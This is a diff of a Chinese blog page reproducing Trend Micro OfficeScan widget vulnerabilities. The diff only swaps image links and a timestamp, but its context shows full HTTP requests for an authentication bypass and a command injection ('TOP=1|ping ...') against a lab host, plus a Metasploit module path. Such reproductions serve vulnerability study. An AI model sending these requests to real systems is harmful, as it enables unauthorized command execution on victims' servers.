@@ -43,13 +43,13 @@
 <meta property="og:site_name" content="Bypass.World">
 <meta property="og:description" content="多数趋势科技的产品都有管理网页的小部件(widget),通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg">
 <meta property="og:image" content="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg">
-<meta property="og:updated_time" content="2017-10-13T02:23:30.000Z">
+<meta property="og:image" content="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg">
+<meta property="og:updated_time" content="2017-10-13T02:54:03.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="趋势科技产品Widgets模块多个漏洞复现">
 <meta name="twitter:description" content="多数趋势科技的产品都有管理网页的小部件(widget),通过分析该功能发现存在多个漏洞，包括命令注入、私钥泄漏、Sqlite6未授权访问、SSRF和认证绕过。">
-<meta name="twitter:image" content="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg">
+<meta name="twitter:image" content="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
@@ -171,8 +171,8 @@
 <p>通过上述分析，构造如下HTTP请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST /officescan/console/html/widget/ui/modLogin/talker.php HTTP/1.1</div><div class="line">Host: 10.211.55.18:8080</div><div class="line">Cookie: LogonUser=root; userID=1; PHPSESSID=51krh5n4d80npijguclead4fc6;</div><div class="line">X-CSRFToken: 51krh5n4d80npijguclead4fc6</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 28</div><div class="line">Connection: close</div><div class="line"></div><div class="line">cid=1&amp;act=check&amp;hash=1&amp;pid=1</div></pre></td></tr></table></figure></p>
 <p>其中<code>X-CSRFToken</code>和<code>PHPSESSID</code>为上步<code>Set-Cookie</code>值，查看响应包可以看到成功认证，包含<code>&quot;message&quot;:&quot;login successfully&quot;</code>内容。</p>
 <h4 id="3-2、命令注入"><a href="#3-2、命令注入" class="headerlink" title="3.2、命令注入"></a>3.2、命令注入</h4><p>将上步通过认证的X-CSRFToken和Cookie带入包含命令注入的HTTP请求中，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST /officescan/console/html/widget/proxy_controller.php HTTP/1.1</div><div class="line">Host: 10.211.55.18:8080</div><div class="line">Cookie: LANG=en_US; LogonUser=root; userID=1; PHPSESSID=51krh5n4d80npijguclead4fc6;</div><div class="line">X-CSRFToken: 51krh5n4d80npijguclead4fc6</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 54</div><div class="line"></div><div class="line">module=modTMCSS&amp;serverid=1&amp;TOP=1|ping 10.211.55.2</div></pre></td></tr></table></figure></p>
-<p>在<code>10.211.55.2</code>上执行<code>tcpdump icmp</code>接收icmp包验证执行情况，可以看到<br>命令成功执行：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg" alt="2A54F323032F5F989BA06B7A11056317.jpg"></p>
-<h2 id="3-3、Metasploit脚本"><a href="#3-3、Metasploit脚本" class="headerlink" title="3.3、Metasploit脚本"></a>3.3、Metasploit脚本</h2><p>Metasploit 已经集成该漏洞EXP，路径为<code>exploit/windows/http/trendmicro_officescan_widget_exec</code>,直接调用如下：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg" alt="D94BF9C93696AFF86DC5D8C32432DC4C.jpg"></p>
+<p>在<code>10.211.55.2</code>上执行<code>tcpdump icmp</code>接收icmp包验证执行情况，可以看到<br>命令成功执行：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba85f1.jpg" alt="D94BF9C93696AFF86DC5D8C32432DC4C.jpg"></p>
+<h2 id="3-3、Metasploit脚本"><a href="#3-3、Metasploit脚本" class="headerlink" title="3.3、Metasploit脚本"></a>3.3、Metasploit脚本</h2><p>Metasploit 已经集成该漏洞EXP，路径为<code>exploit/windows/http/trendmicro_officescan_widget_exec</code>,直接调用如下：<br><img src="https://i.loli.net/2017/10/13/59dfc24ba94dc.jpg" alt="2A54F323032F5F989BA06B7A11056317.jpg"></p>
 
             </div>
           
